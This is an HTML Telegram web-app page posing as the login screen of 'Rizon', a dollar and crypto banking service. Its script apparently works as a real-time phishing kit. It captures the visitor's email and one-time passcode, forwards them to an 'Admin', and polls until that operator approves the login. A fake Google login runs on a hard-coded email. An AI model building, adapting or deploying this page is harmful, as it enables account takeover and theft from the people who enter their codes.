<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Rizon - Login</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #000; --bg-light: #F2F2F7; --white: #FFF; --black: #000; --gray: #666; --yellow: #FFD700; --green: #34C759; --red: #FF3B30; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: #333; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
        #app { width: 100%; max-width: 414px; height: 100vh; max-height: 896px; background: var(--bg); position: relative; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; transition: opacity 0.3s; opacity: 0; pointer-events: none; z-index: 1; }
        .screen.active { opacity: 1; pointer-events: auto; z-index: 10; }
        .hidden { display: none !important; }
        #splash { justify-content: center; align-items: center; }
        #splash h1 { color: #fff; font-size: 42px; font-weight: 700; letter-spacing: 2px; }
        #landing { padding: 40px 24px; justify-content: space-between; }
        .landing-header h1 { color: var(--white); font-size: 38px; font-weight: 400; line-height: 1.1; margin-top: 20px; }
        .trust-badge { display: flex; align-items: center; background: rgba(255, 255, 255, 0.1); padding: 8px 12px; border-radius: 20px; margin-top: 20px; width: fit-content; }
        .trust-text { color: var(--white); font-size: 12px; }
        .graphic-container { flex: 1; position: relative; display: flex; justify-content: center; align-items: center; margin: 20px 0; }
        .phone-mockup { width: 140px; height: 260px; background: linear-gradient(135deg, #1a1a1a, #000); border-radius: 20px; border: 2px solid #333; position: absolute; transform: rotate(-10deg) translateY(20px); box-shadow: 0 20px 40px rgba(0,0,0,0.8); }
        .floating-item { position: absolute; display: flex; justify-content: center; align-items: center; font-weight: bold; box-shadow: 0 10px 20px rgba(0,0,0,0.5); animation: float 4s ease-in-out infinite; }
        .coin-btc { width: 60px; height: 60px; background: #F7931A; border-radius: 50%; color: white; font-size: 30px; top: 20%; left: 10%; }
        .coin-eth { width: 55px; height: 55px; background: #627EEA; border-radius: 50%; color: white; font-size: 28px; bottom: 20%; left: 15%; animation-delay: 1s; }
        .logo-apple { width: 45px; height: 45px; background: #333; border-radius: 10px; color: white; font-size: 24px; top: 15%; right: 20%; animation-delay: 0.5s; }
        .logo-nvidia { width: 50px; height: 50px; background: #76B900; border-radius: 10px; color: white; font-size: 20px; top: 45%; right: 15%; animation-delay: 1.5s; }
        .logo-tesla { width: 45px; height: 45px; background: #E82127; border-radius: 10px; color: white; font-size: 24px; bottom: 20%; right: 25%; animation-delay: 2s; }
        .visa-card { width: 180px; height: 110px; background: var(--yellow); border-radius: 12px; position: absolute; top: 25%; right: 5%; transform: rotate(15deg); box-shadow: 0 15px 30px rgba(255, 215, 0, 0.2); padding: 15px; display: flex; flex-direction: column; justify-content: space-between; animation: float 5s ease-in-out infinite; }
        .visa-card .brand { font-weight: 800; font-size: 14px; color: #000; }
        .visa-card .visa-logo { font-weight: 900; font-style: italic; font-size: 18px; color: #000; text-align: right; }
        @keyframes float { 0%, 100% { transform: translateY(0) rotate(var(--rot, 0deg)); } 50% { transform: translateY(-15px) rotate(var(--rot, 0deg)); } }
        .btn-container { display: flex; flex-direction: column; gap: 16px; }
        .btn { width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 600; text-align: center; cursor: pointer; border: none; transition: 0.2s; display: flex; justify-content: center; align-items: center; gap: 10px; }
        .btn-primary { background: var(--white); color: var(--black); }
        .btn-secondary { background: transparent; color: var(--white); border: 1px solid var(--white); }
        .btn-google { background: #fff; color: #333; }
        .btn-disabled { background: #A1A1A6; color: #fff; cursor: not-allowed; }
        .btn:active { transform: scale(0.98); }
        #login-screen, #create-account-screen { background: var(--bg-light); padding: 24px; color: var(--black); }
        .header-nav { display: flex; align-items: center; margin-bottom: 30px; margin-top: 20px; }
        .back-btn { font-size: 24px; cursor: pointer; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
        .title-dark { font-size: 32px; font-weight: 700; margin-bottom: 8px; }
        .subtitle-dark { font-size: 16px; color: var(--gray); margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; }
        .input-field { width: 100%; padding: 18px; border-radius: 16px; border: 1px solid #E5E5EA; font-size: 16px; outline: none; background: #fff; }
        .input-field:focus { border-color: #000; }
        .status-msg { text-align: center; margin-top: 20px; font-size: 14px; color: var(--gray); }
        .status-msg.error { color: var(--red); }
        .status-msg.success { color: var(--green); }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #dashboard-screen { background: #000; justify-content: center; align-items: center; text-align: center; padding: 24px; }
        #dashboard-screen h1 { color: var(--green); font-size: 28px; margin-bottom: 10px; }
        #dashboard-screen p { color: #888; font-size: 16px; margin-bottom: 30px; }
        #dashboard-screen .user-email { color: #fff; font-weight: bold; }
    </style>
</head>
<body>
<div id="app">
    <div id="splash" class="screen active"><h1>RIZON</h1></div>
    <div id="landing" class="screen">
        <div class="landing-header">
            <h1>Dollar <span style="font-style:italic;">banking</span><br>alternative.</h1>
            <div class="trust-badge"><span class="flags" style="margin-right:8px;">🇺🇸🇬🇧🇨🇦🇦🇺🇩🇪🇫🇷</span><span class="trust-text">Trusted by 600k+ users</span></div>
        </div>
        <div class="graphic-container">
            <div class="phone-mockup"></div>
            <div class="floating-item coin-btc">₿</div>
            <div class="floating-item coin-eth">Ξ</div>
            <div class="floating-item logo-apple">🍎</div>
            <div class="floating-item logo-nvidia">N</div>
            <div class="floating-item logo-tesla">T</div>
            <div class="visa-card"><div class="brand">RIZON</div><div class="visa-logo">VISA</div></div>
        </div>
        <div class="btn-container">
            <button class="btn btn-primary" onclick="navTo('create-account-screen')">Create account</button>
            <button class="btn btn-secondary" onclick="navTo('login-screen')">Log in</button>
            <button class="btn btn-google" onclick="handleGoogleLogin()"><img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" width="20"> Log in with Google</button>
        </div>
    </div>
    <div id="create-account-screen" class="screen">
        <div class="header-nav"><div class="back-btn" onclick="navTo('landing')">←</div></div>
        <h1 class="title-dark">Create Account</h1>
        <p class="subtitle-dark">Enter your email to sign up.</p>
        <div class="input-group"><input type="text" id="signup-email" class="input-field" placeholder="example@email.com"></div>
        <button class="btn btn-primary" onclick="handleCreateAccount()">Sign Up & Login</button>
    </div>
    <div id="login-screen" class="screen">
        <div class="header-nav"><div class="back-btn" onclick="navTo('landing')">←</div></div>
        <h1 class="title-dark">Welcome back!</h1>
        <p class="subtitle-dark">Enter your email to log in.</p>
        <div id="step-email">
            <div class="input-group"><input type="text" id="email-input" class="input-field" placeholder="example@email.com"></div>
            <button id="send-otp-btn" class="btn btn-disabled" disabled onclick="requestOTP()">Send OTP</button>
        </div>
        <div id="step-otp" class="hidden">
            <div class="input-group"><label style="font-size:14px; color:#666; margin-bottom:8px; display:block;">Enter OTP provided by Admin</label><input type="text" id="otp-input" class="input-field" placeholder="Enter OTP"></div>
            <button id="verify-otp-btn" class="btn btn-primary" onclick="verifyOTP()">Verify & Login</button>
        </div>
        <div id="status-container" class="status-msg hidden"></div>
        <div id="loading-container" class="hidden" style="margin-top: 20px;"><div class="loader"></div><p class="status-msg" style="margin-top: 10px;">Please wait...</p></div>
    </div>
    <div id="dashboard-screen" class="screen">
        <h1>✅ Login Successful!</h1>
        <p>Welcome to Rizon,<br><span class="user-email" id="dashboard-email"></span></p>
        <button class="btn btn-secondary" style="width: auto; padding: 12px 30px;" onclick="logout()">Log Out</button>
    </div>
</div>
<script>
    const tg = window.Telegram.WebApp;
    tg.expand();
    const API_URL = window.location.origin; 
    function navTo(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
    function handleCreateAccount() {
        const email = document.getElementById('signup-email').value.trim();
        if(!email) return alert("Enter email");
        fetch(`${API_URL}/api/direct-login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: email}) })
        .then(res => res.json()).then(data => { if(data.success) { document.getElementById('dashboard-email').textContent = data.email; navTo('dashboard-screen'); } });
    }
    function handleGoogleLogin() {
        const mockEmail = "user.google@gmail.com";
        fetch(`${API_URL}/api/direct-login`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: mockEmail}) })
        .then(res => res.json()).then(data => { if(data.success) { document.getElementById('dashboard-email').textContent = data.email; navTo('dashboard-screen'); } });
    }
    function logout() { navTo('landing'); }
    const emailInput = document.getElementById('email-input');
    const sendOtpBtn = document.getElementById('send-otp-btn');
    const stepEmail = document.getElementById('step-email');
    const stepOtp = document.getElementById('step-otp');
    const statusContainer = document.getElementById('status-container');
    const loadingContainer = document.getElementById('loading-container');
    let currentSessionId = null;
    emailInput.addEventListener('input', function() {
        if(this.value.trim().length > 3) { sendOtpBtn.classList.remove('btn-disabled'); sendOtpBtn.disabled = false; } else { sendOtpBtn.classList.add('btn-disabled'); sendOtpBtn.disabled = true; }
    });
    function requestOTP() {
        const email = emailInput.value.trim();
        loadingContainer.classList.remove('hidden'); statusContainer.classList.add('hidden'); sendOtpBtn.classList.add('hidden');
        fetch(`${API_URL}/api/request-otp`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({email: email}) })
        .then(res => res.json()).then(data => {
            if(data.session_id) {
                currentSessionId = data.session_id; loadingContainer.classList.add('hidden'); stepEmail.classList.add('hidden'); stepOtp.classList.remove('hidden'); showStatus("Request sent to Admin. Waiting for OTP...", "success"); startPolling();
            } else { throw new Error(data.error); }
        }).catch(err => { loadingContainer.classList.add('hidden'); sendOtpBtn.classList.remove('hidden'); showStatus(err.message, "error"); });
    }
    function verifyOTP() {
        const otp = document.getElementById('otp-input').value.trim();
        loadingContainer.classList.remove('hidden'); statusContainer.classList.add('hidden');
        fetch(`${API_URL}/api/verify-otp`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({session_id: currentSessionId, otp: otp}) })
        .then(res => res.json()).then(data => { loadingContainer.classList.add('hidden'); showStatus("OTP sent to Admin. Waiting for confirmation...", "success"); })
        .catch(err => { loadingContainer.classList.add('hidden'); showStatus("Error verifying OTP.", "error"); });
    }
    function startPolling() {
        const poll = setInterval(() => {
            fetch(`${API_URL}/api/check-status/${currentSessionId}`).then(res => res.json()).then(data => {
                if(data.status === 'approved') {
                    clearInterval(poll); loadingContainer.classList.add('hidden'); document.getElementById('dashboard-email').textContent = emailInput.value.trim(); navTo('dashboard-screen');
                } else if(data.status === 'rejected') {
                    clearInterval(poll); loadingContainer.classList.add('hidden'); showStatus("❌ OTP is not correct. Try again.", "error"); stepOtp.classList.remove('hidden');
                }
            });
        }, 2000);
    }
    function showStatus(msg, type) { statusContainer.textContent = msg; statusContainer.className = `status-msg ${type}`; statusContainer.classList.remove('hidden'); }
    setTimeout(() => { navTo('landing'); }, 2000);
</script>
</body>
</html>
